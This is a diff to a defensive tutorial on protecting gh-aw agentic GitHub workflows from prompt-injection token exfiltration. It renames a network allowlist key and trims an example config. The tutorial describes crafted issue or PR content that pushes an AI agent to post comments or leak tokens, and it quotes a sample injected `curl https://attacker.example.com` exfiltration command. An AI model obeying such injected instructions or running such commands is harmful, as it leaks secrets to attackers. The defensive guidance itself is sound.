@@ -49,28 +49,26 @@ This protects values that are declared in `secrets:` — including `GITHUB_TOKEN
 
 gh-aw's `safe-outputs` frontmatter key declares the exact output surfaces the agent is allowed to write to. If `create-issue` or `post-comment` are not in that list, the agent has no tool to write those outputs — and therefore no surface to exfiltrate data through those channels.
 
-Example frontmatter that restricts the agent to a single read-only summary surface:
+Example frontmatter that keeps the workflow read-only:
 
 ```yaml
 ---
 permissions:
   contents: read
   issues: read
-safe-outputs:
-  write-summary:
 ---
 ```
 
 An injection asking the agent to open an issue or post a comment will fail because those operations have no execution path.
 
-### `network.allowed-domains` blocks outbound exfiltration
+### `network.allowed` blocks outbound exfiltration
 
 gh-aw lets you declare a firewall allowlist of domains the workflow runner may contact. Any outbound connection to a domain not in the list is rejected.
 
 ```yaml
 ---
 network:
-  allowed-domains:
+  allowed:
     - api.github.com
     - copilot-proxy.githubusercontent.com
 ---
@@ -79,7 +77,7 @@ network:
 Even if an injected instruction tells the agent to `curl https://attacker.example.com`, the network layer blocks that connection before a single byte leaves the runner.
 
 > [!TIP]
-> Keep `allowed-domains` as narrow as possible. Start with only the domains your workflow's tools actually call, and add more only when a specific tool requires it.
+> Keep `allowed` as narrow as possible. Start with only the domains your workflow's tools actually call, and add more only when a specific tool requires it.
 
 ### Inject secrets only in the step that needs them
 
@@ -121,7 +119,7 @@ cannot write, delete, or push even if an attacker crafts an instruction to do so
 |---|---|
 | GitHub Actions log masking | Redacts secret values from all log output |
 | `safe-outputs` | Removes write surfaces the agent cannot use |
-| `network.allowed-domains` | Blocks outbound connections to unauthorized endpoints |
+| `network.allowed` | Blocks outbound connections to unauthorized endpoints |
 | Step-level `env:` injection | Limits which steps can see a secret value |
 | Minimal `permissions:` | Caps what `GITHUB_TOKEN` can authorize at the API |
 
@@ -133,7 +131,7 @@ No single layer is sufficient on its own. Together they make a successful exfilt
 
 | Practice | Why it helps |
 |---|---|
-| Declare `network.allowed-domains` | Prevents outbound data exfiltration to attacker-controlled endpoints |
+| Declare `network.allowed` | Prevents outbound data exfiltration to attacker-controlled endpoints |
 | Use step-level `env:` for secrets | Keeps secret values out of the AI prompt step's environment |
 | Declare a narrow `safe-outputs` set | Removes write channels an attacker could abuse |
 | Keep `permissions:` to the minimum required | Limits what a compromised token can actually do |
@@ -146,7 +144,7 @@ No single layer is sufficient on its own. Together they make a successful exfilt
 - [ ] You can describe how an attacker might try to exfiltrate a token through crafted issue or PR content
 - [ ] You can list three gh-aw features that prevent token exfiltration
 - [ ] You can explain why step-level `env:` injection is safer than global environment variables
-- [ ] You know how to add `network.allowed-domains` to your workflow's frontmatter
+- [ ] You know how to add `network.allowed` to your workflow's frontmatter
 
 ---
 
